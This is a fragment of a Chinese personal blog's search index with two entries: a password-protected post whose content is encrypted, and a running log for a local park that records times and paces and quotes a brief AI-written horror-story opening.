        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请找作者确认" data-whm="文章校验失败">  <script id="hbeData" type="hbeData" data-hmacdigest="2372fa66b47b8a14ffc99b2911a70c1a84a502fd0bb3d9172248f03c3eaa3436">92925db3e24629c8cfeed2d0eece3864e0c35a2bbbb3918a3b6435a017525031cb40e2260f8cb72f773b850bb9ea33bf09130a005fb7125237802cfd7c7bcbbea4757506578d7262f993dfa89af4787afd5d0c3e3a3052776d3c9912807124c09949d3a8d3d8bbc53dd12ed27956ed312430b7965a803f605cc206f91f37f2c8790d209715606b5b6dd3d7de38c64d669958e069ff1a5da57dbf22b8e5ab0abd53572053bcbb3926716e08e951dd3df1b673098f13ac06b881a8342b506718033af9cfe5944f6c7d9cc6f1af1f693c9e437b3e8813e2892122be57f3f15dddd1a4a55c1d5bb22806f65a0d97e981cbfc29419bcb90fdf26f00abdfc636db0681d27f8fd4997d761ff518cdcefe96edb235060c5f2b2354ed534c1bb291eb966dd145b378101b8da21fcef8953259a377f2340c74b2bdce8bda0e5cadefaa19d6d6ea441eac47e1cba1a07c0f6a98dcbc146ddbaedefdc17c55c76b0f9fda9954887caddeb65c1eefc8aa3b3a28951c375c0bd3986b46b716d2e4add420877e9a396e827c099ae3262d0450b12a628b07a955ccd9588e9621a9c62840da7397fdee7d77b2fc214402724cc1bdb2bcf802e1315ce923285ab9ca3d4c0271d9c613b171f7aa5b24fc32d12da4d8e2a57026c4423351735984c1090acc626fddc033220962e2ba9748a99c934eb36a26c1c6cb9ef4c55b2b1069b36a767426deeabc3aa0bc2e7949e2e4c6d0f27300b164c2a43e1721f4d325bda12d69c50f41fbdef959f7431c29866c5375777d1cfdda6617e5a1c8de4ebebb6fe688c131c7fc4fd84308abc52706778aa905110ab8e6fd5e19ea09414a3849568a7a2baacf28970992a52d1b864b3a43d275f00432bf678a07c712ed90a04a77a958d1b23b84dfc663a21592d881f95870e158115826f1a562d48f78bacf95e821c662e9909faa1fdfdc32862fdbda7d6f422bdcee2f8263816b44b2b20e6d7a314e9cdfdba5059f4c1c2d218581a90c5159be692ebf870810302ebd9cebb1b2d8237749f206c491dc8e1f1c3acdfd033a0f4cfd51d48b259e2ad1a7a243c62cc0ca8a5ff761fb33119ed503d6ec0de7ec7d2e576830a8a815d48714fd9431a574adc9d24cf1af1fcc6db6352b90af311b56d1a520c99b272555c63a6ac5449d698abfff8f56ddf80132c6845081889a3a15803dc987e10d65405dd65edcc7d08e4ef82e4f7b85c704abba799b324f6ab782e250d78b410245b2cc632a0e91ab7fe4381dc05102cae5e94dbcd0954809413b724980b84018e5594b2cd8059e23e3e942b768b7e2aca512fdcf1079bf5cb91ccfdbc950f235edb796df7d3889d30cf271d381fd97eef57e417462bb8173533f66e483daaf81ee418b0c57045bfca0943f59dede6e559a6e1a208c8fd1e640d356c05b14acb9a00440921b152d0bb4add29216279db51c3dc07cf815618b1278ad30d46f53daedd17cffed076e1a24b748a4a79f883495eba09a5630fe2962d706c3403c99d475e45cb5fae38360ac2d66e7e4ac7fdc75d7d803fc4361c736f26872549a07e7eb466711c9b6c9274235af20b8edb00f89cee9976a6a648e1234b982d788e6df8c1e3ae519f6f167036722b7140b7db45e433ba2558eb57816bb2c1a45588313f92b4b180571e37f583a26647989cb88949dd3cdaed0dcdbd3645d37500395a8ced87eaf9e66a94fe3d94aa83a5ad25bae9f161734f4b818f590059ced2719c239ab9c20b4ef48ff1707716f6dcdc639ec72045d4f21fb62c45206d78d96d46047e0c469253a2094e57fa2162f27aa94f9507138140382c43dd4f9bea48521bcc14824d691cf86398a26ef0859198ebf1c48bbe1ea6c97224a467eb80398a185ae98f33e68271d7831a512af20cda2952d02fc7b314a6ce8239c320e345cf77ca7776471d0c2510f6e8dfacee88855c03e1210b5a3a3ab9a8a866420b105f652c31187a62896ab6c93afe40904f3ec684ba178aa81d5d84b561f87c9d7e84dd5c32e9848cc5bfa41ccd4d2cff18b7cd559eec6e9056dd52eda976a20536f93f56aa6c04f45e67e5bb1e1d157512f78ae3be73e08668b15294ca50e72eaab45dba881b1a47a12af0bac80660a79744c13d8709245dd35aa0ed13e3618ca093f5f32d10d9867c1fc475041692b8665eaf96a292e49be04fe08839dae5258f6e5d3f3e00077a4257244085094f6aebdd83ff5bfbcb7fb0967b3a09695ea1379e0b3e0cc00fe000e603b665dca5f505558f13fe31653315e8c597db8c83039eec1aa318cc704636e9530d37971eeab31197173aabe33681a4aceb7b75f3d42769ca0058aa7160a7825dacd39b92adc31c1ab36585a3ff6bb6d98e7bff084c54827d4e9eb3261f8854fd90796e18edb5f389f04b3458b5ea2b71a0b4b83a9e663798b835cc3991440ecca8b8ddf3fea4378b3c6f6d9499cd0526282e750a56e2196305e8235e39d8f5670019c09f05a5a281925d8f642ab1470f1234250c614837dc816d40ca4554d46287cc60fdf3d3a83fc2ee40a3a64df2db36aebb1e76cc286ef07294ec7490e21af39321330951053f64106119c59bddccdd1f02694807f90e3526907c57455f229227c4d89d6a33b428d784bef0c85de182375675670bd619da46eac5a3cab071ab7ea460ca5a86ec663ba9ce30d3d91c3a6f3468b7d9dc6df90e2cb662a08c8ad0642e89c7b4fe84c596c6589040d6441d1edf6371320c3767aed3da9af902472830e5d540d626ef5e9dedfd5333bc4264439df7547d5cf8f8ac281207c4bb89716c54464744c233605718d8d2afd0b9ac56a665763f25ee2187d2dfb934a1f1a119725ca2dcdb850b82b772c80472b86001a566fc28c42f8e65ec60a0fb890e157bb9c3904d6007df1f4ee0bec5aa049b2f2f8f7163736443a6d485d351197cd18fd6ba4f645aff0ed434adf6fc374bf3c21e6d2e76a773ebcf1159c4f6b5a6a6f408181ad97d0a518a46d2c52c6d6917bb8dc8b436a7daab18d0400b986c26024bf236426f1c14188a50f410f5d83bf31a7b6428e3d9ab9257d8860ff104d4260c1c756ed51c10d92acc72549526ed1fae43f1d43963b7d7f27e10e8b71619769bd04a093aed8e6ddbfe6ec482f5b75a72fe2473840e81339dab13d53e476e8980ba408578e033f9cee86616ac2adcd9e900f864912c1af9e08693306288993d92467e20febc690bfdb0fa460a473c8de96b07507ba756cf3c995f64d9196dd48dc5fc60c1c13036eca86b726e74b38d6dadca843625b00c7d57f34212b749945a7f6764ae6409dd0d39abbebee4c843dd1c163bc18ca65602f8b7c3ab017a214f3ee4076cabc0e5c6f8a84e580182ce45ecae6d25457024d842bbd9a3782b263b35553606fd68e3b8265196779d1322d3028ef9f95c87a7e77c5dfac37bc540a0b76afc39b068265b4e8dda6ab812af1f5bbbd620eca7d461c6a53aebd54be50ea75142286312c0bef6660238581ca050d44a294c2402a84c16cea3c4cdadb97955c400cc73a205e9b1fa114269a8109e80aeaa1273b74f8b813fdc17492bc2e128079ae8a9d2d0a69f4c3848faec61aeac324f6e0b802697fd4b165ac8418eeac79ebb86a6f1ac160994f362884104dd4a114b36241bf956dddafbbc305702ae2306b457c56eb8ad80f6d58e4725bfe275d853c93fbf79ad02ea9d4ce6ca7afe040cdccfbe85380da96c4d6ec506697cf23a8b0de19dbf56d4adfc9b542f9046581ff6912ece981f64b9ebf11bafa489b3054ab339c12c439a0ee8837bb339d9354175f9c6e98a5672b2401a540b9bda02827947d51d926745bae6a3ca987b292d68cf80b34bf63d31685b13d83a2256726e20eff874799fb15525391776faec15a821478dfa74113a4b8f78ccb6512940e94fa0c723a9127c2b6414c94f5bf5194dad77281edfb3765de0dd01d40e4575830444846a347a53238708f19f44d54db6fe57162c9b5558b148364f366c5e2fbda29bdf8db3e46a5f1bbc5d88a2f23d29cd1ea67bed1702663aae1c28f79a6785039419bf62a118f12452553ed4fe05b0f19c0d4c600a193af0a8e6a25459125293edcb514eb8573c4da1b0cee04f73efe8132a6e46807bcd8d4e3326e2755ec391b29e77f807649b8287fab339e5cb87326211eea476abfc6b5463e9e606bfa6066a190cc781fa8e0bce081178260eb1a9d1688b3480950b65579cc7161d52a5430acd24dd14ead252d07381b78688d964b16a0ff6d2756f1286f5e6534f19a7ae9dbfea9d58a22c2a83d2f06eae9ca3ebfaa6bf157448aa342e44feba1b42a6e460393dc58fd19b5180f5d271d6bae8f1b51563caab92d1add22c10353407720ba892cf9b27405bca5b34bee88bb451894fc7b192199b187da07de4500b145c8a73df30540f52c553a0b921b496f934af3c10d0c00750387126f477429ca64032be659d19b3b2993a26cbe3318de1e48a886c43a7ec4dc7709a4c67388e69a913dab571a90cf02f8b77838cd2ad7884cf2725168def781191b013fe38f254d656ec8a0e0481922ad319efdafb75f8f2f84278d8a8fd5c332bd91b7c17df3b73e2d70d3afcc01f35fc2cdfd49af341f42070b4880856eceba3b424ab8d9c0519be2bc9a898418c2109916f1b9ac9d5969342e8bc3b3977c7e7428891fab1fa47d6e618594f3b57bf2826dc1c321c312f46cd25c0dba3dc62f19f0c6ee8907fa1ea02c1e2322c3e4e79a8c9f7adb4b31aff538283116c970de91e90ac9b55e2fdadf2a75e8723e8ac24487c87586d87f216468ec24e8d9d798752c148e41c3726ec64e05f06eb69584fdcdc6a58cd910e7ff3d32345ebba35e7a2c6d089e9d3c6f577c816d1e4bbd78b6b3485762303163fdbbf446b2455a6103356394f0bacbc2ad847e1f253ae87e2996bb9f02b37e70c6fda7498c5a4f34dc5778cd847590a9afc69192125273d98a3dfeaf53bb4865e7821e8ff97d02575b09517607ed2af28d8667c028c010d0032796b44dd0b47e01cc47c68c69358c206d7923ffe13b5fd01491840c6d5e20a721b6d0ce2cbb572d335d763c253797b72a3868f18912b475840396edc861e7f63a83befcd2333d49bd0e3cf2e6e490edd6500a594727b595e4c87e4fb6c5f9e40b49a37d85d30200e7e38f0ec4a11444e3e8bf18c3fb8f07739c9112cbb1c37df9ba521db67c229508e4535cfee1e6501528688ea1fbf067f3dae06387ad3ce1db11c7d4949931460d1d83f1382762e98fa293b17daab664342d0233eefd86e16a14971deaf4ec3aee9ed3ef8032b879787aa177030a7d94c6868eca6321a538515fc5c7d35f3e67e2ef5a38331bbe3467a4742b9ef5c658b182f5e582275610bb80d3fc44ef3b568763ba71214dff48a6013aa10d5ad5a8ff8bf595872cce159b0d45baf63ccad9826a9eb6272d780f5721c9c8a559bb75bcd96d3faafcd4de349e772ca0725c2ab64c7bad207c9d87a7796c7442c24c2c561a676ae026bc7f854879ca5063390aaec194613ae5b640b547a4758cadf79a7f87de20bd900f82bc9b774c1823037aa528c79a9b85fda1a15ef9e86be872518156f4f6029eeec967d7d512f2e3c0055d1a9df609e8b2497b8859e5f9a55b1d28b0d4b32b51adb0f9b42ef0f6fc922d9ac40a9b00c82a030dc6110da04ae5fc7bf134c08cfaecfab7e55e746d2ece929ae6509ed2a31504fa881720cec71b3b52fa6bf4bcf4002c6114b57b1aba9f9f382ac866cddafc15cfd5ceb6989492783afe2d4344bd4ead763e44489676dbc6c9e9f7dfb8a5e1448ceaec59fcc04972aaf406181ac5a6d94173c51e9e9908d90829d864dba45e650fca5ba3b0ac8b6d954f1eab97f48f30168db82e58562fda3f2081d9b77dd45c83718b658af0cf47ff5dd9e815384f2af15bfb7df56e6480a0b8bfb044bf20ccbf8f3bf2eef7b1ffabd8b8bd51851ad5fc3b160e7bc0c3f69b23cafc0828ec72ed0f2e75895af801d2bdce5ad058ec86db96458d512ba3d4043b19a9feda77c699493c76c288efc8bcbcbbff900c191d1bbd5c0a13bd407088b4d08cb6d99ffb0d9c5540684a66f3ead514fc5a0a575550aec59fa6419304be868b61d333e25cd3af8a3c282d92d1ac34</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-blink">      <input class="hbe hbe-input-field hbe-input-field-blink" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-blink" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-blink" data-content="请输入密码后查看">请输入密码后查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> private50 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>四得公园的第五圈</title>
      <link href="/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E5%9B%9B%E5%BE%97%E5%85%AC%E5%9B%AD%E7%9A%84%E7%AC%AC%E4%BA%94%E5%9C%88/"/>
      <url>/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E5%9B%9B%E5%BE%97%E5%85%AC%E5%9B%AD%E7%9A%84%E7%AC%AC%E4%BA%94%E5%9C%88/</url>
      
        <content type="html"><![CDATA[<p>没事干准备开始跑步，打算记录一下数据和感受。每次都记下来，一定程度上也能降低半途而废的可能性。</p><h3 id="一期计划"><a href="#一期计划" class="headerlink" title="一期计划"></a>一期计划</h3><ul><li>目标：全程跑五圈，耗时半小时以内</li><li>地点：四得公园</li><li>距离：大概4.7公里</li></ul><p>组合起来好像是一个可以写恐怖故事的Title。</p><h3 id="AI恐怖故事"><a href="#AI恐怖故事" class="headerlink" title="AI恐怖故事"></a>AI恐怖故事</h3><p>问：以 四得公园的第五圈 为题目写一个100字的有关跑步的恐怖故事开头</p><blockquote><p>答：在四得公园，有一条被跑者们敬而远之的小径。传说，每当夜幕降临，那里就会出现一个无面的跑者，他以超乎常人的速度在圈内奔跑，追逐那些敢于深夜跑步的人。一个不信邪的跑步爱好者，决定挑战这个传说。一天深夜，带着他的手机和一腔勇气，他来到了第五圈。刚开始，一切似乎都很正常，直到他听到了身后不断加速的脚步声.. </p></blockquote><h3 id="五圈"><a href="#五圈" class="headerlink" title="五圈"></a>五圈</h3><p>目标：跑完全程</p><table><thead><tr><th>间隔天数</th><th>开始时间</th><th>耗时</th><th>配速</th><th align="left">备注</th></tr></thead><tbody><tr><td>nil</td><td>19:55</td><td>00:46:06</td><td>09‘44</td><td align="left">跑1圈半，走3圈半<br>腿疼了两天</td></tr><tr><td>2</td><td>20:23</td><td>00:40:15</td><td>08’34</td><td align="left">跑2圈半，走2圈半</td></tr><tr><td>1</td><td>20:59</td><td>00:37:43</td><td>08‘05</td><td align="left">跑3圈，走2圈<br> 公园21:25关路灯</td></tr><tr><td>1</td><td>20:55</td><td>00:38:59</td><td>08’13</td><td align="left">太拉了，半圈就开始跑不动了</td></tr><tr><td>1</td><td>20:28</td><td>00:35:30</td><td>07’33</td><td align="left"></td></tr><tr><td>1</td><td>20:53</td><td>00:34:49</td><td>07’31</td><td align="left"></td></tr><tr><td>1</td><td>18:38</td><td>00:32:13</td><td>07’01</td><td align="left">全程跑5圈</td></tr><tr><td>5</td><td>20:29</td><td>00:32:54</td><td>07’08</td><td align="left">膝盖疼，停了几天</td></tr></tbody></table><h3 id="五公里"><a href="#五公里" class="headerlink" title="五公里"></a>五公里</h3><p>目标：6分配，轻松</p><table><thead><tr><th>间隔天数</th><th>开始时间</th><th>耗时</th><th>配速</th><th>备注</th></tr></thead><tbody><tr><td>0</td><td>20:36</td><td>00:34:39</td><td>06‘50</td><td>出小区开始跑，刚好5公里(第一次5公里)</td></tr><tr><td>2</td><td>07:54</td><td>00:32:58</td><td>06’33</td><td>早上跑也不错</td></tr><tr><td>1</td><td>20:35</td><td>00:34:10</td><td>06’43</td><td>跑起来不是非常费力了</td></tr><tr><td>1</td><td>18:50</td><td>00:32:07</td><td>06‘21</td><td>第一圈6分配，还算轻松</td></tr><tr><td>16</td><td>20:45</td><td>00:31:41</td><td>06’19</td><td>停了半个月，没有大的退步</td></tr><tr><td>2</td><td>08:10</td><td>00:29:27</td><td>06’16</td><td>5圈，不够5km，前两圈跑快了</td></tr><tr><td>1</td><td>18:26</td><td>00:31:26</td><td>06‘17</td><td>最后一圈还是很吃力，前两圈太快</td></tr><tr><td>2</td><td>08.07</td><td>00:30:48</td><td>06’09</td><td></td></tr><tr><td>0</td><td>20:51</td><td>00:31:36</td><td>06’20</td><td>控制前两圈，轻松点</td></tr><tr><td>3</td><td>20:40</td><td>00:24:23</td><td>06’32</td><td>4圈</td></tr><tr><td>1</td><td>08:02</td><td>00:30:27</td><td>06’09</td><td></td></tr><tr><td>0</td><td>07:49</td><td>00:30:24</td><td>06’06</td><td></td></tr><tr><td>0</td><td>20:52</td><td>00:29:28</td><td>05‘53</td><td>第一次跑进6分内</td></tr><tr><td>1</td><td>19:27</td><td>00:29:23</td><td>05’52</td><td></td></tr><tr><td>0</td><td>20:52</td><td>00:28:37</td><td>05’44</td><td>每天进步一点，也挺让人上瘾</td></tr><tr><td>1</td><td>20:45</td><td>00:28:22</td><td>05’40</td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h3 id="五公里-1"><a href="#五公里-1" class="headerlink" title="五公里"></a>五公里</h3><p>目标：5分配</p><table><thead><tr><th>间隔天数</th><th>开始时间</th><th>耗时</th><th>配速</th><th>备注</th></tr></thead><tbody><tr><td>1</td><td>20:35</td><td>28:28</td><td>5’42</td><td></td></tr><tr><td>1</td><td>20:56</td><td>28:05</td><td>5’37</td><td></td></tr><tr><td>1</td><td>20:05</td><td>30:43</td><td>6’07</td><td>跑不动</td></tr><tr><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h3 id="八公里（跳过）"><a href="#八公里（跳过）" class="headerlink" title="八公里（跳过）"></a>八公里（跳过）</h3><p>目标：全程跑</p><h3 id="十公里"><a href="#十公里" class="headerlink" title="十公里"></a>十公里</h3><p>目标：1h</p><table><thead><tr><th>时间</th><th>耗时</th><th>配速</th><th>备注</th></tr></thead><tbody><tr><td>06-21 20:23</td><td>01:02:26</td><td>06‘13</td><td>压着跑，相对轻松</td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><h3 id="十五公里"><a href="#十五公里" class="headerlink" title="十五公里"></a>十五公里</h3><h3 id="二十公里"><a href="#二十公里" class="headerlink" title="二十公里"></a>二十公里</h3><h3 id="半马"><a href="#半马" class="headerlink" title="半马"></a>半马</h3>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> private3 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
